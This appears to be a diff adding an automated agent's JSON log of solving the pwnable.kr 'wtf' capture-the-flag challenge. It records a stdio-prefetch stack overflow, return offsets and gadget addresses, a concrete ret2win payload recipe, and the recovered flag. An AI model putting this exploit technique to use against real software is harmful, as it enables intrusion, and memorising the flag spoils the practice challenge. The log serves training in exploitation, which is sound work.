@@ -1,0 +1,11 @@
+{"t": "init", "chal": "pwnable-wtf", "ts": 1784036041}
+{"t": "note", "text": "pwnable.kr wtf selected: Grotesque unsolved for ssttff; target ssh wtf@pwnable.kr -p2222 pw guest; wrapper says nc 0 10039 and expects hex payload", "ts": 1784036041}
+{"t": "hypothesis", "text": "scanf(\"%d\") accepts -1 and stdio prebuffers 4096 bytes; put real overflow stage after byte 4096 so my_fgets raw read receives it", "ts": 1784036345}
+{"t": "offset", "k": "stdio_prefetch", "v": "4096", "src": "strace read(0, ..., 4096) by scanf before my_fgets raw read", "ts": 1784036345}
+{"t": "offset", "k": "ret2main_ret", "v": "56", "src": "local sweep: prefix 4096 then stage offset 56 controls main return", "ts": 1784036345}
+{"t": "offset", "k": "ret_gadget", "v": "0x400668", "src": "single ret for system stack alignment", "ts": 1784036345}
+{"t": "offset", "k": "win", "v": "0x4005f4", "src": "symbol table win calls system(\"/bin/cat flag\")", "ts": 1784036345}
+{"t": "primitive", "name": "ret2win_prefetch", "status": "pass", "evidence": "local: payload -1 + 4093 pad + A*56 + ret(0x400668)+win(0x4005f4) prints LOCAL_WTF_FLAG", "ts": 1784036345}
+{"t": "ok", "text": "remote pwnable.kr:10039 fresh solve.py prints LIBC_buff3ring_dr1ves_m3_cr4zy", "ts": 1784036416}
+{"t": "next", "text": "Human submit flag to pwnable.kr; auto-submit intentionally skipped per honest-mode", "ts": 1784036416}
+{"t": "ok", "text": "flag LIBC_buff3ring_dr1ves_m3_cr4zy verified from remote pwnable.kr:10039 via solve.py; not submitted automatically", "ts": 1784036430}
